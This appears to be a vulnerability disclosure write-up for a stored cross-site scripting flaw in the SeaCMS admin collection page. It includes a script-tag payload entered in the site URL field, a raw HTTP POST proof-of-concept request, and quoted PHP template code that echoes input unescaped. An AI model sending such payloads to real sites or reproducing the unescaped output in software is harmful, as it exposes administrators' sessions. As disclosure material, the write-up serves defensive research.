admin_collect_news.php storage xss

Visit admin_collect_news.php

Enter the following page

![image-20240821010940757](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821010940757.png)

Click to add collection items, then click Next

![image-20240821011038657](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821011038657.png)

Enter the target site URL

`<script>alert(2)</script>`

![image-20240821011104414](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821011104414.png)

Click to save the information and proceed to the next step of settings.

![](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821011136585.png)

Success pop-up window

POC

```java
POST /p8qca/admin_collect_news.php?action=addrule HTTP/1.1
Host: seacms:8181
Content-Length: 335
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms:8181
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/p8qca/admin_collect_news.php?action=addrule&id=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5dl35hp50uj606p52se8kg91a2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D
Connection: keep-alive

step=2&id=5&itemname=111&intodatabase=0&siteurl=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&coding=gb2312&playfrom=seacms&downfrom=&autocls=0&classid=0&inithit=0&pageset=0&pageurl0=123123&pageurl1=&istart=1&iend=1&pageurl2=&Submit=%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AF%E5%B9%B6%E8%BF%9B%E5%85%A5%E4%B8%8B%E4%B8%80%E6%AD%A5%E8%AE%BE%E7%BD%AE
```



**code analysis**

```java
if($action=="addrule")
{
	if($step==2){
		if(empty($itemname))
		{
			ShowMsg("请填写采集名称！","-1");
			exit();
		}
		$removecode = implode('|',$removecode);
		$listconfig = "{seacms:listrule cid=\"$id\" tname=\"$itemname\" intodatabase=\"$intodatabase\" isupdate=\"$isupdate\" getherday=\"$getherday\" siteurl=\"$siteurl\" playfrom=\"$playfrom\" autocls=\"$autocls\" classid=\"$classid\" removecode=\"$removecode\" inithit=\"$inithit\" pageset=\"$pageset\" pageurl0=\"$pageurl0\" pageurl1=\"$pageurl1\" istart=\"$istart\" iend=\"$iend\" reverse=\"$reverse\"}";
		include(sea_ADMIN.'/templets/admin_collect_ruleadd2.htm');
		exit();
	}elseif($step==test){
		$listconfig = urldecode($listconfig);
		$listconfig.="
			{seacms:pageurl2}$pageurl2{/seacms:pageurl2}
			{seacms:lista}$lista{/seacms:lista}
			{seacms:listb}$listb{/seacms:listb}
			{seacms:mlinka}$mlinka{/seacms:mlinka}
			{seacms:mlinkb}$mlinkb{/seacms:mlinkb}
			{seacms:picmode}$picmode{/seacms:picmode}
			{seacms:pica}$pica{/seacms:pica}
			{seacms:picb}$picb{/seacms:picb}
			{seacms:pic_trim}$pic_trim{/seacms:pic_trim}
{/seacms:listrule}\r\n";
		$tmplistconfig = stripslashes($listconfig);
		$links=array();
		$links = Testlists($tmplistconfig,$coding,$sock);
		include(sea_ADMIN.'/templets/admin_collect_ruleadd2test.htm');
		exit();
```

我们可以控制$pageurl2的值，而且包含了/templets/admin_collect_ruleadd2test.htm文件，来到这个文件

```php
<form name="addruleform" id="addruleform" method="post" action="?action=addrule">
  <input type='hidden' name='step' value='test' />
  <input type="hidden" name="id" value="<?php echo $id;?>" />
  <input type="hidden" name="itemname" value="<?php echo $itemname;?>" />
  <input type="hidden" name="siteurl" value="<?php echo $siteurl;?>" />
  <input type="hidden" name="coding" value="<?php echo $coding;?>" />
  <input type="hidden" name="sock" value="<?php echo $sock;?>" />
  <input type="hidden" name="playfrom" value="<?php echo $playfrom;?>" />
  <input type="hidden" name="autocls" value="<?php echo $autocls;?>" />
  <input type="hidden" name="classid" value="<?php echo $classid;?>" />
  <input type="hidden" name="getherday" value="<?php echo $getherday;?>" />
  <input type='hidden' name="intodatabase" value="<?php echo $intodatabase;?>" />
  <input type='hidden' name="listconfig" value="<?php echo urlencode($listconfig);?>" />
  <table class="tb2" id="step2">
```

You can see that our $siteurl is output and stored in the database, resulting in stored xss
